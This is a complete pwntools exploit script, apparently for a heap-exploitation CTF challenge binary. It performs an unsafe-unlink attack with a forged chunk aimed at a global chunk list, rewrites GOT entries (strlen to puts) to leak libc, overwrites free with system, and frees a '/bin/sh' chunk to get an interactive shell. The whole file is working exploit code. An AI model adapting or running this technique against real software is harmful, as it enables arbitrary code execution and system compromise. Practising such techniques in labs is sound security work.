from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary, checksec=False)
libc = e.libc

gs = '''
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

CHUNKLIST = 0x6020c0


def allocate(size, data):
    p.sendlineafter(b'>>', b'1')
    p.sendlineafter(b'Size:', b'%i' % size)
    p.sendlineafter(b'Data:', data)


def free(idx):
    p.sendlineafter(b'>>', b'3')
    p.sendlineafter(b'Index:', b'%i' % idx)


def edit(idx, data):
    p.sendlineafter(b'>>', b'2')
    p.sendlineafter(b'Index:', b'%i' % idx)
    p.sendlineafter(b'Data:', data)


def make_initial_chunks():
    allocate(0x98, b'A' * 0x98)
    allocate(0x98, b'B' * 0x98)
    allocate(0x98, b'C' * 0x98)
    allocate(0x98, b'D' * 0x98)
    allocate(0x98, b'E' * 0x98)

    log.info("Allocated Initial (5) Chunks.")
    pause()


def make_fake_chunk():

    fake_chunk = p64(0x0)                   # fake prev_size
    fake_chunk += p64(0x91)                 # fake size
    fake_chunk += p64(CHUNKLIST)            # fake fd pointer
    fake_chunk += p64(CHUNKLIST+8)          # fake bk pointer
    fake_chunk += b'F' * (0x70)              # fake user data

    fake_chunk += p64(0x90)                 # next chunk prev_size
    fake_chunk += p16(0xa0)                 # next chunk prev_in_use
    edit(3, fake_chunk)
    log.info("Made Fake Chunk Inside Chunk (3)")
    pause()


def coalesce_chunks():
    free(4)
    log.info("Freed Chunk (4), causing colescing of Chunks (3,4) into Larger Chunk.")
    pause()


def leak_libc():
    edit(3, p64(e.got['strlen']))
    log.info("Edited chunk 3 to pt to strlen got")
    pause()

    edit(0, p64(e.plt['puts']))
    log.info("Edited chunk 0 to pt to puts plt")
    pause()

    edit(3, p64(e.got['free']))
    log.info("Edited chunk 3 to pt to free got")
    pause()

    p.sendline(b'2')                # 2: Edit
    p.sendlineafter(b'Index: ', b'0')       # Index 0

    free_leak = u64(p.recv(6) + b'\x00\x00')
    log.success('Free Leak: ' + hex(free_leak))
    libc.address = free_leak - libc.symbols['free']
    log.success('Libc base: ' + hex(libc.address))
    pause()


def trigger_system():
    p.recvuntil(b'Data: ')
    system = p64(libc.symbols['system'])
    p.sendline(system)
    log.info("free() replaced with System")
    pause()

    allocate(0x98, b'/bin/sh\0')
    log.info("Allocated Chunk (4) with /bin/sh; call free(4) for shell")
    pause()

    free(4)
    log.info("Freed, Chunk (4) - trigggering system")


make_initial_chunks()
make_fake_chunk()
coalesce_chunks()
leak_libc()
trigger_system()

p.interactive()
